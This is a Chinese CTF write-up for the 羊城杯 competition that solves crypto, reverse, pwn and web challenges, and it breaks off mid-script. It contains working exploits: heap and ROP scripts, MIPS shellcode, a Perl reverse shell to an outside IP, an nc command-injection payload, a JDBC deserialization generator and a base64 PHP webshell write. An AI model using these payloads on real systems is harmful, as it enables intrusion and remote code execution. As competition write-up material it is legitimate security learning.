# 羊城杯

## com

```
360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983
822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626
717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213
20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689
642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071
488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209
464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063
388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784
332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602
676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990
938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943
78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461
938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244
894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064
319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041
913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322
351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073
786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868
8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965
434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233
366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602
515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162
883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730
498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522
552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629
596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453
717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378
118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748
238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183
223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555
838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252
805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217
598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611
784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295
1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387
```

观察格式发现是一个36*35的矩阵，很容易想到是一个35元一次线性方程组

```
from z3 import *

a="""360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983
822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626
717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213
20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689
642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071
488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209
464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063
388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784
332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602
676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990
938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943
78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461
938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244
894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064
319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041
913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322
351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073
786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868
8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965
434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233
366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602
515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162
883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730
498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522
552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629
596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453
717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378
118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748
238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183
223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555
838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252
805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217
598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611
784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295
1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387"""
a=a.splitlines()
s=[]
result=[0]*35
for i in a:
    s.append(i.split(" "))

solve = Solver()
X =  [Int('x%s' % i) for i in range(35) ]
for i in range(len(s)):
    for j in range(len(s[i][:-1])):
        result[i]+=int(s[i][j])*X[j]
for i in range(len(s)):
    solve.add(result[i]==int(s[i][-1]))
print solve.check()
m = solve.model()
print "traversing model..."
pri=[]
for i in range(35):
    pri.append(int("%s" % (m[X[i]])))
print pri

```

GWHT{4b55c1d5fb6a0234fc252b19e510301a}



## signin



利用unsorted bin的残酷main_aren指针leak地址，deouble打malloc_hook为one_gadget拿shell

exp被改去打babypwn了0.0



## repwn

魔改了下xxtea的算法，解密后能泄露libc和栈地址，接着用`fastbin attack`攻击栈，orw读取flag

开了沙盒

```
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

exp:

```
from pwn import *

context.arch = 'amd64'

# context.terminal = ["tmux","split-window","-h"]

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice:")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("?")
	p.sendline(str(sz))
	sleep(0.1)
	p.send(content)

def dele(idx):
	cmd(3)
	p.recvuntil("?")
	p.sendline(str(idx))

def show(content):
	cmd(2)
	p.send(content)

def main(host,port=10035):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process(["./x86_sandbox","-debug",'-info'])
		p = process("./pwn2")
		# gdb.attach(p)
		
	show('\n')
	enc = p.recvuntil("wellcome",drop=True)                                                                                                                                               
	p1 = process("./decrypt")
	p1.send(enc)
	dec = p1.recv(0x10)
	libc.address = u64(dec[:8]) - 0x5f1a88
	stack = u64(dec[8:])
	add(0x68,"AAAAAAAA\n")
	add(0x68,"AAAAAAAA\n")
	dele(0)
	dele(1)
	dele(0)
	info("libc: " + hex(libc.address))
	info("stack: " + hex(stack))
	add(0x68,p64(stack-0xf3)+'\n')
	add(0x68,"AAAAA\n")
	add(0x68,"AAAAA\n")
	
	# 0x000000000019dc65: pop rdi; ret;
	# 0x000000000013cd4f: pop rsi; ret;
	# 0x0000000000115166: pop rdx; ret;
	# 0x000000000003a738: pop rax; ret; 
	# 0x00000000000bc3f5: syscall; ret;
	p_rdi = 0x000000000019dc65 + libc.address
	p_rsi = 0x000000000013cd4f + libc.address
	p_rdx = 0x0000000000115166 + libc.address
	p_rax = 0x000000000003a738 + libc.address
	syscall_ret = 0x00000000000bc3f5 + libc.address
	rop_chain = [
		p_rdx,0x200,p_rax,0,
		syscall_ret
	]
	payload = flat(rop_chain)
	# debug(0x000000000000E62)
	add(0x68,"A"*0x2b+payload+'\n')
	
	pause()
	# '/flag' at stack - 0xe3
	rop_chain = [
		p_rdi,stack-0xe3,p_rsi,0,p_rdx,0,p_rax,2,syscall_ret,
		p_rdi,3,p_rsi,stack+0x300,p_rdx,0x40,p_rax,0,syscall_ret,
		p_rdi,1,p_rsi,stack+0x300,p_rdx,0x40,p_rax,1,
		syscall_ret
	]
	payload =  "/flag\x00\x00\0x00"+"A"*0x48+flat(rop_chain)
	p.send(payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])
```

decrypt.c

```
#include <stdio.h>  
#include <stdint.h>  
#include <unistd.h>
#define DELTA 0x76129BDA  
#define MX ( ( ((z>>7)^(y<<3)) + ((y>>2)^(z<<5))-0x21 ) ^ ((sum^y^0x57) + (key[(p&3)^e] ^ z)+0x3f) )   
// #define MX (((((z>>7)^(y<<3)) + ((y>>2)^(z<<5)))-0x21) ^ (((sum^y^0x57) + (key[e^p&3] ^ z))+0x3f))   
void btea(uint8_t *v, int n, uint32_t const key[4])  
{  
	uint8_t y,z;
    uint32_t sum;  
    unsigned p, rounds, e;  
    if (n > 1)            /* Coding Part */  
    {  
        rounds = 7 + 35/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        {  
            sum += DELTA;  
            e = (sum >> 2) & 3;  
            for (p=0; p<n-1; p++)  
            {  
                y = v[p+1];  
                z = v[p] += MX;  
            }  
            y = v[0];  
            z = v[n-1] += MX;  
        }  
        while (--rounds);  
    }  
    else if (n < -1)      /* Decoding Part */  
    {  
        n = -n;  
        rounds = 7 + 35/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        {  
            e = (sum >> 2) & 3;  
            for (p=n-1; p>0; p--)  
            {  
                z = v[p-1];  
                y = v[p] -= MX;  
            }  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        }  
        while (--rounds);  
    }  
}  
  
  
int main()  
{  
    uint8_t v[32]= {0};  
    uint32_t const k[4]= {0x33,0x12,0x78,0x24};  
    int n= 16; 
    
	read(0,v,0x10); 
    btea((uint8_t*)v, -n, k);  
    write(1,v,0x10);  
    return 0;  
}  
```



## mipspwn

远程也用的qemu的user mode，那就变的简单许多了，直接add一个堆块把shellcode填上，接着直接栈溢出跳到堆地址执行shellcode拿shell，shellcode在shell storm上抄了一个

```
from pwn import *
# context.update(arch='mips')

def cmd(c):
	p.sendlineafter("Your choice: ",str(c))

def add(idx,length):
	cmd(1)
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(length))
	

def edit(index, cont):
	cmd(3)
	p.sendlineafter('?', str(index))
	p.sendlineafter(': ', cont)

def exp(host, port=10030):
	global p
	if host:
		p = remote(host, port)
	else:
		p = process(['qemu-mipsel','-L','/mnt/hgfs/shared/ycbctf/mipspwn/','-g', '1234', './pwn2'])
		# p = process(['qemu-mipsel','./pwn2'])
	p.sendlineafter("leave your name here:","AA")
	shellcode = "\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01"
	shellcode += "/bin/sh\x00"
	add(0,0xf0)
	edit(0,shellcode+'\n')
	cmd(7)
	p.recvuntil("feeling:")
	payload = b"A"*0x3c+p32(0x00412008)
	p.send(payload)
	p.interactive()

if __name__ == '__main__':
    exp(args['REMOTE'])
```







## easycon

直接命令执行
disable:function
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare

在web目录下发现`bbbbbbbbb.txt`,看它的二进制码发现是jpg文件，拿到flag

## blackhat

查看Hei_Mao_Jing_Chang.mp3发现源文件代码：

```
if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){
    die('˭�����Ҳ���һֻ����β�ͣ�');
}

$clandestine = getenv("clandestine");

if(isset($_POST['White-cat-monitor']))
    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);


$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);

if($hh !== $_POST['Black-Cat-Sheriff']){
    die('������׼�����������������������Ҫ��׼��Ŀ�ꡣ�����Լ���������ǿ����а��ĵ��ӵ���');
}

echo exec("nc".$_POST['One-ear']);

```

令`$_POST['White-cat-monitor']`为空从而控制`$clandestine`

```php
import hmac
import requests

cmd=b" ccreater.top:60006||cat /var/www/html/flag.php"
h = hmac.new(b"", cmd, digestmod='sha256').hexdigest()


burp0_url = "http://183.129.189.60:10022/"
burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data = {"White-cat-monitor[]": '', "One-ear": cmd, "Black-Cat-Sheriff": h}
r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(r.text)
```

拿到flag



## easyphp2

扫目录发现robots.txt得到提示：

`/?file=check.php`

利用file处的任意文件读取获得 check.php内容（用zlib压缩绕过base64被ban），获得密码：GWHT,一次读取GWHT.php得知count参数可以任意命令执行,全局查找发现

/GWHT/system/of/a/down/flag.txt

`http://183.129.189.60:10025/GWHT.php?count=123'%26%26cat+/GWHT/system/of/a/down/flag.txt%26%26sss%26%26'`

/GWHT/目录下的readme存着GWHT的密码，去cmd5花一块钱解密得到密码

My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6. :`GWHTCTF` 

/GWHT下findaas的内容（原本以为这个文件有S权限）

```bash=
#! /bin/bash

echo "Enter a filename and find it here!"

find . -name $1
```
利用反弹shell来登陆GWHT


反弹shell
```
system('perl -e \'use Socket;$i="39.108.164.219";$p=60007;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
```
`GWHT{Y0U_H4VE_A_BETTER_SK1LL}`

## easyjava

https://www.anquanke.com/post/id/203086
JDBC反序列化：
InfoInvocationHandler::invoke->Databaseinfo::checkAllInfo->DriverManager.getConnection


```java=
@GetMapping("/hello")
    public String hello(@CookieValue(value = "data", required = false)String cookieData, Model model) {
        if (cookieData == null || cookieData.equals("")) {
            return "redirect:/index";
        }
        Info info = (Info)deserialize(cookieData);
        if (info != null) {
            model.addAttribute("info", info.getAllInfo());
        }
        return "hello";
    }
```

DatabaseInfo

```java=


public class DatabaseInfo implements Serializable, Info {

...

    private void connect() {
        String url = "jdbc:mysql://" + this.host + ":" + this.port + "/jdbc?user=" + this.username + "&password=" + this.password + "&connectTimeout=3000&socketTimeout=6000";
        try {
            this.connection = DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Boolean checkAllInfo() {
        if (this.host == null || this.port == null || this.username == null || this.password == null) {
            return false;
        }
        if (this.connection == null) {
            connect();
        }
        return true;
    }


```


```java=
public class InfoInvocationHandler implements InvocationHandler, Serializable {
    private Info info;

    public InfoInvocationHandler(Info info) {
        this.info = info;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        try {
            if (method.getName().equals("getAllInfo")) {
                if (!this.info.checkAllInfo()) {
                    return null;
                }
            }
            return method.invoke(this.info, args);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
```

利用proxyinstance来调用InfoInvocationHandler 的invoke方法从而完成上述的利用链

利用这个来生成data

```java=
import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class test {
    public static void main(String args[]){
        DatabaseInfo db = new DatabaseInfo();
        db.setHost("39.108.164.219");
        db.setPort("60006");
        //db.setUsername("yso_JRE8u20_calc&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&");
        db.setUsername("Spring1&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&");
        db.setPassword("123456");
        InvocationHandler handler = new InfoInvocationHandler(db);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(bout);
            out.writeObject(Proxy.newProxyInstance(handler.getClass().getClassLoader(), db.getClass().getInterfaces(), handler));
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(new String(Base64.getEncoder().encode(bout.toByteArray())));

    }
}

```

测试发现CommonsCollections6和CommonsCollections5可以打通，但是由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法,利用这个来绕过http://www.jackson-t.ca/runtime-exec-payloads.html
`GWHT{5e97245bd9c98aad7040d461538e9231}`

jdbc也可以直接读文件，但是这里不行，后来看别人的wp发现要加上设置：`allowLoadLocalInfile=true`



## easyphp

往别的文件写一句话无法执行，直接往index.php写一句话

## easyser

1. 扫目录=》robots.txt=》star1.php
2. ssrf`http://183.129.189.60:10024/sandbox/5b43f3acd937ec28c24a26dbbca1ada9/star1.php?path=http%3A%2F%2F127.0.0.1%2Fsandbox%2F5b43f3acd937ec28c24a26dbbca1ada9%2Fser.php`拿到ser.php源码
3. 简单的反序列化，要利用的点在Yongen的hasaki() ->file_put_contents($this->file,'<?php die("nononon");?>'.$this->text);
4. `'<?php die("nononon");?>.$text`这个点利用`php://filter/write=convert.base64-decode/resource=a1.php`绕过
5. 最终payload：`http://183.129.189.60:10024/sandbox/5b43f3acd937ec28c24a26dbbca1ada9/star1.php?path=http://127.0.0.1/sandbox/5b43f3acd937ec28c24a26dbbca1ada9/ser.php&c=O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A56%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Da1.php%22%3Bs%3A4%3A%22text%22%3Bs%3A43%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbJ3Rlc3QnXSkgPz4%3D%22%3B%7D%7D`即在a1.php中写入一句话，直接cat /*拿到flag





## login

IDA字符串窗口看到一大堆Py_开头的字符串，以及pyinstaller，确定是pyinstaller打包的exe，利用pyinstxtractor和uncompyle6反编译成.py文件：

```python
# uncompyle6 version 3.7.3
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]
# Embedded file name: login.py
# Compiled at: 1995-09-28 00:18:56
# Size of source mod 2**32: 257 bytes
import sys
input1 = input('input something:')
if len(input1) != 14:
    print('Wrong length!')
    sys.exit()
else:
    code = []
    for i in range(13):
        code.append(ord(input1[i]) ^ ord(input1[(i + 1)]))

    code.append(ord(input1[13]))
    a1 = code[2]
    a2 = code[1]
    a3 = code[0]
    a4 = code[3]
    a5 = code[4]
    a6 = code[5]
    a7 = code[6]
    a8 = code[7]
    a9 = code[9]
    a10 = code[8]
    a11 = code[10]
    a12 = code[11]
    a13 = code[12]
    a14 = code[13]
    if (a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) & (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) & (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) & (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 << 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) & (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) & (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) & (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) & (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) & (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) & (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) & (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) & (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) & (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) & (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317):
        print('flag is GWHT{md5(your_input)}')
        print('Congratulations and have fun!')
    else:
        print('Sorry,plz try again...')
```

脚本：

```python
from z3 import *
import hashlib

a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = BitVecs('a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14', 7)

